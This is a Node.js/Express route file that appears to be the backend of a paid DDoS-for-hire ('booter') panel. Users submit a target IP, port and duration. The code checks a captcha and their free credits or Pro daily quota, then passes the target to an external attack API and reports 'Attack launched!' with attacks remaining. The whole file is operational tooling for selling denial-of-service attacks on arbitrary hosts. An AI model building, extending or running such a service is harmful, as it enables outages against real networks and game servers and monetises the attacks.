// routes/panel.js (Updated version)
const express = require('express');
const router = express.Router();
const auth = require('../middleware/authMiddleware');
const User = require('../models/User');
const axios = require('axios');
const Stats = require('../models/Stats');
const bgmiService = require('../services/bgmiService');
require('dotenv').config();
const rateLimit = require('express-rate-limit');

// In-memory attack tracker
const activeAttacks = new Map();

// Blocked ports
const BLOCKED_PORTS = new Set([8700, 20000, 443, 17500, 9031, 20002, 20001]);

// Captcha blacklist
const usedCaptchaTokens = new Map();

function blacklistToken(token) {
    usedCaptchaTokens.set(token, Date.now() + 310_000);
    for (const [t, exp] of usedCaptchaTokens) {
        if (Date.now() > exp) usedCaptchaTokens.delete(t);
    }
}

function isTokenBlacklisted(token) {
    const exp = usedCaptchaTokens.get(token);
    if (!exp) return false;
    if (Date.now() > exp) { usedCaptchaTokens.delete(token); return false; }
    return true;
}

async function verifyTurnstile(token, ip) {
    if (!token || token.length < 10) return { success: false };
    if (isTokenBlacklisted(token)) return { success: false, 'error-codes': ['duplicate-use'] };
    try {
        const params = new URLSearchParams({
            secret: process.env.TURNSTILE_SECRET,
            response: token,
        });
        if (ip && ip !== '::1' && !ip.startsWith('::ffff:127')) {
            params.append('remoteip', ip);
        }
        const { data } = await axios.post(
            'https://challenges.cloudflare.com/turnstile/v0/siteverify',
            params,
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        );
        if (data.success) blacklistToken(token);
        return data;
    } catch {
        return { success: false };
    }
}

// GET /api/panel/me
router.get('/me', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        
        await user.checkAndResetDailyCredits();
        
        res.json({
            ...user.toObject(),
            isPro: user.isProUser(),
            remainingAttacks: await user.getRemainingAttacks(),
            maxDuration: user.getMaxDuration(),
            subscriptionStatus: user.getSubscriptionStatus()
        });
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});

// GET /api/panel/attack-status
router.get('/attack-status', auth, async (req, res) => {
    try {
        const attackInfo = activeAttacks.get(req.user.id.toString());

        if (!attackInfo) {
            return res.json({ success: true, data: { status: 'idle' } });
        }

        const elapsed = Date.now() - new Date(attackInfo.startedAt).getTime();
        if (elapsed >= attackInfo.duration * 1000) {
            activeAttacks.delete(req.user.id.toString());
            return res.json({ success: true, data: { status: 'completed' } });
        }

        return res.json({
            success: true,
            data: {
                status: 'running',
                ip: attackInfo.ip,
                port: attackInfo.port,
                duration: attackInfo.duration,
                startedAt: attackInfo.startedAt,
                timeLeft: attackInfo.duration - Math.floor(elapsed / 1000)
            }
        });
    } catch (err) {
        console.error('Attack status error:', err);
        res.status(500).json({ message: 'Server error. Please try again.' });
    }
});

// GET /api/panel/stats
const statsLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 10,
    message: { totalAttacks: 0, totalUsers: 0 }
});

router.get('/stats', statsLimiter, async (req, res) => {
    try {
        const stats = await Stats.findById('global');
        res.json({
            totalAttacks: stats?.totalAttacks || 0,
            totalUsers: stats?.totalUsers || 0,
        });
    } catch {
        res.status(500).json({ message: 'Server error' });
    }
});

// POST /api/panel/attack - UPDATED with new credit/daily system
router.post('/attack', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });

        const { ip, port, duration, captchaToken } = req.body;

        if (!ip || !port || !duration)
            return res.status(400).json({ message: 'IP, port, and duration are required' });

        const clientIp = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
        const captchaResult = await verifyTurnstile(captchaToken, clientIp);
        if (!captchaResult.success)
            return res.status(403).json({ message: 'Captcha verification failed. Please try again.' });

        // Validate IP
        const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
        if (!ipRegex.test(ip))
            return res.status(400).json({ message: 'Invalid IP address format' });

        // Validate port
        const portNum = parseInt(port);
        if (isNaN(portNum) || portNum < 1 || portNum > 65535)
            return res.status(400).json({ message: 'Port must be between 1 and 65535' });

        if (BLOCKED_PORTS.has(portNum))
            return res.status(400).json({ message: `Port ${portNum} is blocked.` });

        // Validate duration based on user type
        const durNum = parseInt(duration);
        const MAX_DURATION = user.isProUser() ? 300 : 60;

        if (isNaN(durNum) || durNum < 1)
            return res.status(400).json({ message: 'Duration must be at least 1 second' });

        if (durNum > MAX_DURATION)
            return res.status(403).json({
                message: user.isProUser()
                    ? 'Duration cannot exceed 300 seconds'
                    : 'Free accounts limited to 60s. Upgrade to Pro for 300s.',
                maxDuration: MAX_DURATION,
                isPro: user.isProUser(),
            });

        // Check if user can attack (new method)
        const canAttack = await user.canAttack();
        if (!canAttack) {
            const remaining = await user.getRemainingAttacks();
            return res.status(403).json({ 
                message: user.isProUser() 
                    ? 'Daily attack limit reached (30 attacks). Please try again tomorrow.'
                    : 'Insufficient credits. Purchase credits or upgrade to Pro for unlimited attacks!',
                remainingAttacks: remaining,
                isPro: user.isProUser(),
                maxAttacks: user.isProUser() ? 30 : 'credits based'
            });
        }

        // Check for active attack
        if (activeAttacks.has(user._id.toString()))
            return res.status(400).json({ message: 'You already have an attack running.' });

        // Call external API
        const response = await axios.post(
            process.env.API_URL,
            { param1: ip, param2: portNum, param3: durNum },
            {
                headers: { 'Content-Type': 'application/json', 'x-api-key': process.env.API_KEY },
                timeout: 15000,
                validateStatus: () => true
            }
        );

        console.log(`[ATTACK] ${user.username} → ${ip}:${portNum} ${durNum}s | API: ${response.status} | Type: ${user.isProUser() ? 'PRO' : 'FREE'}`);

        if (response.status !== 200 || response.data?.error) {
            if (response.data?.error?.includes('Max concurrent')) {
                return res.status(429).json({
                    message: 'Server busy. Please wait 5 seconds and try again.',
                    cooldown: 5
                });
            }
            return res.status(response.status || 400).json({
                message: response.data?.error || 'Failed to start attack'
            });
        }

        // Use one attack (deducts from credits for free users, from daily for pro)
        await user.useAttack();
        
        // Get updated remaining attacks
        const remainingAttacks = await user.getRemainingAttacks();

        const startedAt = new Date().toISOString();
        activeAttacks.set(user._id.toString(), { ip, port: portNum, duration: durNum, startedAt });

        setTimeout(() => {
            activeAttacks.delete(user._id.toString());
        }, durNum * 1000 + 5000);

        await Stats.findByIdAndUpdate('global', { $inc: { totalAttacks: 1 } }, { upsert: true });

        return res.json({
            message: user.isProUser() 
                ? `Attack launched! (${remainingAttacks} attacks remaining today)`
                : `Attack launched! (${remainingAttacks} credits remaining)`,
            attack: { ip, port: portNum, duration: durNum, startedAt },
            remainingAttacks: remainingAttacks,
            isPro: user.isProUser(),
            credits: user.credits,
            dailyCredits: user.subscription.dailyCredits,
            totalAttacks: user.totalAttacks
        });

    } catch (err) {
        console.error(`[ERROR] Attack route: ${err.message}`);
        res.status(500).json({ message: err.message || 'Server error. Please try again.' });
    }
});

// NEW: Get user dashboard stats
router.get('/dashboard', auth, async (req, res) => {
    try {
        const user = await User.findById(req.user.id).select('-password');
        if (!user) return res.status(404).json({ message: 'User not found' });
        
        await user.checkAndResetDailyCredits();
        
        const subscriptionStatus = user.getSubscriptionStatus();
        
        res.json({
            user: {
                username: user.username,
                email: user.email,
                userId: user.userId,
                isPro: user.isProUser(),
                credits: user.credits,
                totalAttacks: user.totalAttacks,
                referralCode: user.referralCode,
                referralCount: user.referralCount
            },
            stats: {
                remainingAttacks: await user.getRemainingAttacks(),
                dailyAttacksUsed: user.dailyAttacks.count,
                dailyAttacksLimit: user.isProUser() ? 30 : (user.credits > 0 ? 'Unlimited with credits' : '0'),
                maxDuration: user.getMaxDuration(),
                subscription: subscriptionStatus
            }
        });
    } catch (err) {
        console.error('Dashboard error:', err);
        res.status(500).json({ message: 'Server error' });
    }
});

module.exports = router;